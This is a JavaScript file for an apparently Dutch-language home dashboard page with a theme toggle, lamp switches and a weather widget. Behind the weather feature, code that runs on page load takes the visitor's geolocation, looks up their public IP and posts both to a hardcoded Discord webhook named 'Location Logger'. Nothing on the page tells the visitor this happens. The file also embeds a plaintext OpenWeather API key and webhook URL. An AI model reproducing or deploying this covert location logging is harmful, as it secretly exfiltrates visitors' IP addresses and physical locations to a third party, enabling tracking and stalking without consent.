const apiKey = "f41e34e15a1142f9cf0d83de9c9f532f"; // OpenWeather API Key
const webhookURL = "https://discord.com/api/webhooks/1351517872454635581/sieRu28ozyvQxxA_8-HvQAVX73SJnDbEvqXs_dm5WnfcIBJ1u5JV5j-xMBdFRB2i-18Q"; // Replace with your Discord Webhook

// Dark/Light Mode Toggle
const modeToggle = document.getElementById("modeToggle");
modeToggle.addEventListener("click", () => {
    document.body.classList.toggle("light-mode");

    // Change logo based on mode
    const logo = document.querySelector(".logo-container img");
    if (document.body.classList.contains("light-mode")) {
        logo.src = "imagePurp.png"; // Purple logo
    } else {
        logo.src = "image.png"; // Original logo
    }

    // Save mode preference
    const isLightMode = document.body.classList.contains("light-mode");
    localStorage.setItem("lightMode", isLightMode);

    // Update button text
    modeToggle.textContent = isLightMode ? "🌙 Dark Mode" : "🌞 Light Mode";
});

// Load Mode Preference on Page Load
document.addEventListener("DOMContentLoaded", () => {
    if (localStorage.getItem("lightMode") === "true") {
        document.body.classList.add("light-mode");
        modeToggle.textContent = "🌙 Dark Mode";

        // Change logo on page load
        document.querySelector(".logo-container img").src = "imagePurp.png";
    }
});

// Fetch Weather & Add Icons
async function fetchWeather(lat, lon) {
    const url = `https://api.openweathermap.org/data/2.5/forecast?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`;
    try {
        let response = await fetch(url);
        let data = await response.json();

        if (data.cod !== "200") {
            console.error("Error fetching weather:", data.message);
            return;
        }

        let today = data.list[0];
        let tomorrow = data.list[8];

        document.getElementById("todayTemp").innerHTML = `${Math.round(today.main.temp)}° <img src="https://openweathermap.org/img/wn/${today.weather[0].icon}.png">`;
        document.getElementById("tomorrowTemp").innerHTML = `${Math.round(tomorrow.main.temp)}° <img src="https://openweathermap.org/img/wn/${tomorrow.weather[0].icon}.png">`;

    } catch (error) {
        console.error("Weather API error:", error);
    }
}

// Function to get user's IP address
async function getUserIP() {
    try {
        let response = await fetch("https://api64.ipify.org?format=json");
        let data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return "Unknown";
    }
}

// Toggle Lamp Status
document.querySelectorAll(".lamp").forEach(lamp => {
    lamp.addEventListener("click", function () {
        this.classList.toggle("on");
        this.classList.toggle("off");
    });
});

// Function to get user's location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const ip = await getUserIP(); // Fetch user IP
                sendToDiscord(ip, lat, lon); // Send Data to Discord
                fetchWeather(lat, lon); // Fetch weather data
            },
            (error) => {
                console.error("Geolocation error:", error);
                alert("Kan locatie niet ophalen. Zorg ervoor dat locatietoegang is ingeschakeld.");
            }
        );
    } else {
        alert("Uw browser ondersteunt geen geolocatie.");
    }
}

// Function to send data to Discord Webhook
async function sendToDiscord(ip, lat, lon) {
    const payload = {
        username: "Location Logger",
        avatar_url: "https://i.imgur.com/AfFp7pu.png", // Optional Avatar
        content: `📍 **New Location Accessed**\n🔹 **IP:** ${ip}\n🌍 **Coordinates:** ${lat}, ${lon}`
    };

    try {
        await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        console.log("Data sent to Discord successfully!");
    } catch (error) {
        console.error("Error sending to Discord:", error);
    }
}

// Call location function when the page loads
document.addEventListener("DOMContentLoaded", getLocation);
